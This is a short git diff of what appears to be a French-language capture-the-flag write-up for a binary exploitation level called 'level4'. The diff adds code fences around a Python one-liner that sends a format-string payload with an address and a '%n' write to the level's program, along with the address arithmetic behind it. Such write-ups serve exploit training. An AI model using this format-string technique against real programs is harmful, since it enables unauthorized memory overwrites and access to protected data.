@@ -18,7 +18,7 @@ $1 = (<data variable, no debug info> *) 0x8049810
 ```
 
 1025544 en hexa = 16930116 - 4 de l'adresse 16930112
-
+```
 python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' | ./level4
-
+```
 Pas besoin de cat car cela affiche le mdp directement
